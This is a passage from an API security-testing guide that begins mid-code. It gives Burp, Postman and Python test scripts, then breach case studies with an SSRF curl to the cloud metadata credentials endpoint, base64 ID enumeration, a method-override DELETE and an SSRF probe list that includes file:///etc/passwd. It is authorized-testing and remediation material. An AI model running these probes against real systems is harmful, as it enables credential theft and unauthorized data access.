resp = requests.post("https://target.com/webhooks/payment", json=fake_payload)
if resp.status_code == 200:
    print("WEBHOOK SIGNATURE NOT VALIDATED — forged event may have been accepted")
```

2. **Check for SSRF via outgoing webhook URLs.** If the target lets users register a webhook URL to receive callbacks, test whether that URL is validated against internal address ranges (this is the same class of issue as the Capital One SSRF case study below, delivered through a webhook-registration feature instead of a direct fetch parameter).

---

## Tools Deep Dive

### Burp Suite Professional Configuration for API Testing

**1. Proxy Setup**:
- Open Burp Suite > Proxy > Options
- Add proxy listener on 127.0.0.1:8080
- Invisible proxy support for non-browser apps: Check "Support invisible proxying"

**2. Target Scope Configuration**:
- Go to Target > Scope
- Add your target API domain (e.g., `*.target.com`)
- Use "Advanced Scope Control" for fine-grained inclusion/exclusion

**3. Essential Extensions for API Testing**:

| Extension | Purpose | Installation |
|-----------|---------|--------------|
| **Autorize** | Automated BOLA/BFLA detection | BApp Store |
| **AuthMatrix** | Role-based access control matrix | BApp Store |
| **InQL** | GraphQL schema introspection and testing | BApp Store |
| **Turbo Intruder** | High-speed fuzzing with Python scripts | BApp Store |
| **JSON Web Tokens** | JWT decoding, editing, and attacks | BApp Store |

**4. Intruder Configuration for API Fuzzing**:

```bash
# Position 1: User ID
GET /api/v1/users/§1001§/profile

# Payload: Numbers (sequential)
1,2,3,4,5...2000

# Position 2: Endpoint path
GET §/api/v1/users/1001§

# Payload: Custom wordlist
/api/v1/admin/users
/api/v1/internal/config
/api/v1/debug/status
```

### Postman for Security Testing

**Setting up Postman with Burp**:
1. Postman Settings > Proxy > Global Proxy Configuration
2. Proxy Server: 127.0.0.1, Port: 8080
3. Disable SSL verification for testing: Settings > General > toggle off "SSL certificate verification"

**Creating Security Test Collection**:

```javascript
// Pre-request script for authentication
const baseUrl = pm.environment.get("base_url");
const token = pm.environment.get("access_token");

if (token) {
    pm.request.headers.add({
        key: "Authorization",
        value: `Bearer ${token}`
    });
}

// Test script for BOLA detection
pm.test("No BOLA - Other user data protected", function() {
    if (pm.response.code === 200) {
        const responseData = pm.response.json();
        const expectedUserId = pm.environment.get("expected_user_id");
        const actualUserId = responseData.id || responseData.user_id;

        pm.expect(actualUserId.toString()).to.equal(expectedUserId);
    }
});

// Test script for excessive data exposure
pm.test("No sensitive data exposure", function() {
    const responseText = pm.response.text();
    const sensitivePatterns = [
        "password", "secret", "token", "ssn",
        "credit_card", "cvv", "internal"
    ];

    for (const pattern of sensitivePatterns) {
        pm.expect(responseText.toLowerCase()).to.not.include(pattern);
    }
});

// Test script for rate limiting
pm.test("Rate limiting active", function() {
    if (pm.response.code === 429) {
        console.log("Rate limit triggered - good");
    } else if (pm.response.code === 200) {
        console.warn("No rate limiting detected");
    }
});
```

**Running Security Tests with Newman**:
```bash
# Install Newman
npm install -g newman

# Run security test collection with HTML report
newman run "API-Security-Tests.postman_collection.json" \
  --environment "production-env.json" \
  --reporters cli,html \
  --reporter-html-export security-report.html \
  --iteration-count 100 \
  --delay-request 100
```

### Python Testing Framework

```python
import requests
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from typing import List, Dict, Optional

@dataclass
class Vulnerability:
    name: str
    severity: str
    endpoint: str
    description: str
    proof: str

class APISecurityTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.vulnerabilities = []

    def test_bola(self, user_a_token: str, user_b_token: str, user_a_id: int, user_b_id: int):
        """Test for Broken Object Level Authorization"""
        headers_a = {"Authorization": f"Bearer {user_a_token}"}

        # Try to access User B's profile as User A
        resp = requests.get(
            f"{self.base_url}/api/v1/users/{user_b_id}",
            headers=headers_a
        )

        if resp.status_code == 200:
            self.vulnerabilities.append(Vulnerability(
                name="BOLA - Horizontal Privilege Escalation",
                severity="High",
                endpoint=f"GET /api/v1/users/{user_b_id}",
                description="User A can access User B's profile using their own token",
                proof=f"curl -H 'Authorization: Bearer {user_a_token}' {self.base_url}/api/v1/users/{user_b_id}"
            ))

    def test_rate_limiting(self, endpoint: str, num_requests: int = 100):
        """Test for rate limiting implementation"""
        responses = []

        for i in range(num_requests):
            resp = requests.get(f"{self.base_url}{endpoint}")
            responses.append(resp.status_code)

        if 429 not in responses:
            self.vulnerabilities.append(Vulnerability(
                name="Missing Rate Limiting",
                severity="Medium",
                endpoint=endpoint,
                description=f"No rate limiting detected after {num_requests} requests",
                proof=f"Successfully sent {num_requests} requests without throttling"
            ))

    def test_jwt_vulnerabilities(self, token: str):
        """Test for JWT vulnerabilities"""
        import jwt

        # Test none algorithm
        header = jwt.get_unverified_header(token)
        if header.get('alg') == 'HS256':
            # Try to decode with weak secret
            try:
                decoded = jwt.decode(token, 'secret', algorithms=['HS256'])
                self.vulnerabilities.append(Vulnerability(
                    name="JWT Weak Secret",
                    severity="Critical",
                    endpoint="JWT Token",
                    description="JWT can be decoded with weak secret 'secret'",
                    proof=f"Decoded claims: {decoded}"
                ))
            except:
                pass

    def run_all_tests(self):
        """Execute all security tests"""
        print("[*] Starting API Security Tests...")
        print(f"[*] Target: {self.base_url}")

        # Add your test execution here
        print(f"[*] Found {len(self.vulnerabilities)} vulnerabilities")

        for vuln in self.vulnerabilities:
            print(f"\n[{vuln.severity}] {vuln.name}")
            print(f"    Endpoint: {vuln.endpoint}")
            print(f"    Description: {vuln.description}")
```

---

## Real-World Breach Analysis

### Case Study 1: Capital One (2019) - SSRF via Metadata Endpoint

**Vulnerability**: Server-Side Request Forgery (SSRF) affecting a misconfigured Web Application Firewall (WAF) in front of Capital One's cloud infrastructure allowed a crafted request to reach AWS's internal instance-metadata service.

> **Correction/clarification on the illustrative curl below:** The real breach was not a case of an API endpoint with an obvious `?url=` fetch parameter. It exploited a misconfigured WAF that could itself be tricked (via SSRF) into making a request to the internal metadata service on behalf of the attacker, returning temporary IAM credentials in the WAF's response. The command below is a simplified stand-in for "some component that fetches attacker-influenced URLs server-side" — the actual vulnerable surface in your target could just as easily be a webhook URL field, a PDF/image renderer that fetches a URL, an XML parser with external entity resolution, or a "test this URL" feature, not necessarily a dedicated `/fetch` endpoint.

**Illustrative exploitation pattern**:
```bash
curl "https://api.capitalone.com/v1/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
```

**Why It Worked**:
- A component reachable from the internet could be induced to make server-side requests to attacker-chosen URLs
- No validation of internal vs. external destination addresses
- The AWS metadata endpoint (`169.254.169.254`) was reachable from that component and returned temporary credentials without an additional auth check (this specific gap is largely closed by IMDSv2, which requires a session token obtained via a PUT request — check whether the target's cloud environment has migrated to IMDSv2 before assuming this exact path is still viable)

**Impact**: AWS credentials retrieved, then used to access S3 buckets containing roughly 100 million customer records.

**How to Test for This**:
```python
internal_endpoints = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:80",
    "http://internal-api.company.com/health",
    "file:///etc/passwd"
]

for url in internal_endpoints:
    resp = requests.get(f"https://target.com/api/fetch?url={url}")
    if resp.status_code == 200 and ("root:" in resp.text or "secret" in resp.text):
        print(f"SSRF FOUND: {url} returned data")
```

When testing your own target, don't limit this to an obvious `?url=` parameter — check every feature that accepts a URL, hostname, or file path as user input and processes it server-side (webhook registration, "import from URL," avatar-from-URL, PDF generation, XML upload, RSS/feed readers).

### Case Study 2: Optus (2022) - Encoded Sequential ID Exposure

**Vulnerability, as widely reported (not officially confirmed by Optus)**: An internet-facing API endpoint required no authentication, and the identifiers it accepted were reportedly sequential integers passed through a reversible encoding.

**Illustrative exploitation pattern**:
```bash
echo -n "100000000" | base64  # MTAwMDAwMDAw
echo -n "100000001" | base64  # MTAwMDAwMDAx
```

**Why It Worked (as reported)**:
- Customer IDs were sequential integers
- Encoding with base64 provided no actual security (encoding is not encryption)
- No authorization check was enforced on the endpoint regardless of encoding

**Impact**: Approximately 9.8 million customer records exposed, reportedly including names, emails, addresses, and passport numbers.

**How to Test for This**:
```python
import base64

def test_encoded_idor(base_endpoint, start_id=100000000, count=100):
    for i in range(start_id, start_id + count):
        # Try different encodings
        encoded_b64 = base64.b64encode(str(i).encode()).decode()
        encoded_b64_urlsafe = base64.urlsafe_b64encode(str(i).encode()).decode()
        encoded_hex = hex(i)[2:]

        for encoded in [encoded_b64, encoded_b64_urlsafe, encoded_hex, str(i)]:
            resp = requests.get(f"{base_endpoint}/{encoded}")
            if resp.status_code == 200:
                print(f"IDOR: {i} accessible via {encoded}")
```

### Case Study 3: Microsoft Teams (2021) - HTTP Method Override

**Vulnerability**: API accepted `X-HTTP-Method-Override` header to change HTTP methods.

**Exploitation Method**:
```bash
curl -X POST https://teams.microsoft.com/api/messages/12345 \
  -H "X-HTTP-Method-Override: DELETE" \
  -H "Authorization: Bearer $USER_TOKEN"
```

**Why It Worked**:
- API used method override to handle DELETE through POST
- No authorization check on the overridden method
- Regular users could delete any team message

**Impact**: Any authenticated user could delete any team message.

**How to Test for This**:
```python
def test_method_override(endpoint, auth_token):
    methods_to_test = ['DELETE', 'PUT', 'PATCH']
    override_headers = [
        'X-HTTP-Method-Override',
        'X-Method-Override',
        'X-HTTP-Method'
    ]

    for method in methods_to_test:
        for header in override_headers:
            resp = requests.post(
                endpoint,
                headers={
                    'Authorization': f'Bearer {auth_token}',
                    header: method
                }
            )
            if resp.status_code in (200, 201, 204):
                print(f"METHOD OVERRIDE: {header}: {method} works on {endpoint}")
```

---

## Testing Checklist

### Pre-Testing Phase
- [ ] Obtain written authorization for testing
- [ ] Define scope (endpoints, methods, data types)
- [ ] Set up testing environment (Burp, Postman, Python)
- [ ] Create test accounts (2 regular users, 1 admin)
- [ ] Capture baseline traffic through proxy
- [ ] Confirm what infrastructure sits in front of the target (CDN/WAF/API gateway) so header-based bypass tests can be scoped realistically
- [ ] If a mobile app is in scope, confirm certificate pinning status and complete the pinning bypass steps before proceeding
- [ ] Confirm data-handling rules for anything captured during testing (redaction, retention, destruction) with the client

### Discovery Phase
- [ ] Enumerate all API endpoints (Swagger, OpenAPI, traffic capture)
- [ ] Identify authentication mechanisms (JWT, OAuth, API keys)
- [ ] Map object ID patterns (sequential, UUID, encoded)
- [ ] Discover shadow APIs and undocumented endpoints
- [ ] Check for GraphQL endpoints and introspection
- [ ] Check for WebSocket connections and webhook registration/delivery endpoints
- [ ] Identify all live API versions in use (e.g., `/v1/`, `/v2/`) — older versions often lack authorization fixes applied to current ones

### BOLA Testing Phase
- [ ] Test horizontal privilege escalation (User A accessing User B data)
- [ ] Test vertical privilege escalation (User accessing admin data)
- [ ] Test parameter pollution techniques
- [ ] Test nested resource access
- [ ] Test batch operations for IDOR
- [ ] Run Autorize automated checks
- [ ] Re-run BOLA checks against each discovered API version, not just the current one

### Authentication Testing Phase
- [ ] Test endpoints without authentication
- [ ] Test JWT vulnerabilities (none algorithm, weak secret, algorithm confusion)
- [ ] Test header injection bypasses (confirmed against the origin, not just a CDN edge)
- [ ] Test HTTP method override
- [ ] Test password reset flows

### Authorization Testing Phase
- [ ] Test BFLA (regular user accessing admin functions)
- [ ] Test HTTP method swapping (GET to DELETE)
- [ ] Test hidden admin parameters
- [ ] Test internal/debug endpoints

### Data Exposure Testing Phase
- [ ] Examine all API responses for sensitive data
- [ ] Compare responses between user roles
- [ ] Test GraphQL field suggestions
- [ ] Check error messages for stack traces

### Rate Limiting Testing Phase
- [ ] Test basic rate limiting with 100+ requests
- [ ] Test IP rotation bypasses
- [ ] Test parameter pollution bypasses
- [ ] Test case variation bypasses

### GraphQL Testing Phase
- [ ] Test for introspection enabled (use the full canonical query, not just the minimal check)
- [ ] Test batch query attacks (capped and cleared with the client first)
- [ ] Test circular/deeply nested queries (against staging where possible)
- [ ] Test GraphQL BOLA via node IDs

### Real-Time / Event-Driven API Testing Phase
- [ ] Test WebSocket connections for per-message authorization (not just connection-time auth)
- [ ] Test WebSocket origin validation
- [ ] Test webhook signature validation on incoming events
- [ ] Test outgoing webhook URL registration for SSRF

### Cleanup Phase
- [ ] Reverse any privilege escalations granted during testing (demote test accounts back)
- [ ] Restore or delete any test objects/records created during BOLA/BFLA testing
- [ ] Confirm no test data or forged tokens remain valid/active in the target system

### Reporting Phase
- [ ] Document each vulnerability with reproduction steps
- [ ] Include proof of concept (curl command or Python script)
- [ ] Assign severity based on impact
- [ ] Provide remediation recommendations
- [ ] Create executive summary
- [ ] Flag any findings based on community-reported (rather than vendor-confirmed) details as such, if referenced for context

---

## Remediation Recommendations

### For BOLA Vulnerabilities
- Implement server-side authorization checks for every object access
- Use unpredictable object identifiers (UUID v4 instead of sequential integers)
- Never trust client-supplied object IDs without verification

### For Authentication Bypass
- Reject the `none` algorithm for JWT
- Use strong JWT secrets (minimum 32 characters random)
- Implement proper token expiration and rotation
- Never trust headers like `X-Forwarded-For` for security decisions

### For BFLA
- Implement role-based access control (RBAC) on the server side
- Never rely on client-side role enforcement
- Deny all access by default, explicitly grant permissions

### For Excessive Data Exposure
- Use API response schemas that only include necessary fields
- Implement field-level authorization for sensitive data
- Never return database objects directly to clients

### For Rate Limiting
- Implement rate limiting on all production endpoints
- Use IP-based and user-based rate limiting together
- Rate limiting should be applied before authentication checks
- Consider using API gateway for rate limiting

### For SSRF
- Maintain an allowlist of permitted destination hosts for any server-side URL fetch (webhooks, imports, previews)
- Block requests to link-local and internal address ranges (169.254.0.0/16, RFC 1918 ranges, loopback) at the application layer, not just the network layer
- Migrate cloud metadata service access to a version requiring an explicit token exchange (e.g., IMDSv2) rather than a plain unauthenticated GET

### For WebSocket/Webhook Issues
- Re-validate authorization on every message received over a WebSocket connection, not just at handshake time
- Validate the `Origin` header on WebSocket upgrade requests
- Require and verify HMAC signatures on all incoming webhook payloads
- Validate outgoing webhook destination URLs against the same internal-address blocklist used for SSRF protection

---

## Resources

### Tools
- **Burp Suite Professional**: https://portswigger.net/burp
- **OWASP ZAP**: https://www.zaproxy.org/
- **Postman**: https://www.postman.com/
- **APIsec**: Automated API security testing
- **Kiterunner**: API endpoint discovery
- **Frida / objection**: Mobile certificate pinning bypass and runtime instrumentation

### Extensions
- **Autorize** (Burp BApp Store)
- **AuthMatrix** (Burp BApp Store)
- **InQL** (Burp BApp Store for GraphQL)
- **Turbo Intruder** (Burp BApp Store)

### Learning Resources
- **OWASP API Security Top 10**: https://owasp.org/www-project-api-security/
- **OWASP Business Logic Abuse Top 10**: https://owasp.org/www-project-business-logic-abuse/
- **PortSwigger API Security Academy**: https://portswigger.net/web-security/api-testing

### Practice Targets
- **OWASP crAPI** (Completely Ridiculous API) - Vulnerable API for practice
- **OWASP Juice Shop** - Includes API vulnerabilities
- **Damn Vulnerable GraphQL Application**

### Documentation
- [OWASP API Penetration Testing Checklist](https://owasp.org/www-project-api-security/)
- [REST Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)
- [GraphQL Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)

---

## Final Notes

API security testing requires thinking like an attacker. Automated scanners are essential for baseline coverage, but they cannot detect business logic flaws that cause most API breaches. Manual testing with tools like Burp Suite and targeted scripts will find the vulnerabilities that matter most.

Always test with authorization in a controlled environment first. When testing production systems, use read-only operations where possible, schedule during off-peak hours, throttle any test that mutates state or consumes resources, coordinate with the security team, and confirm data-handling rules for anything captured during testing.
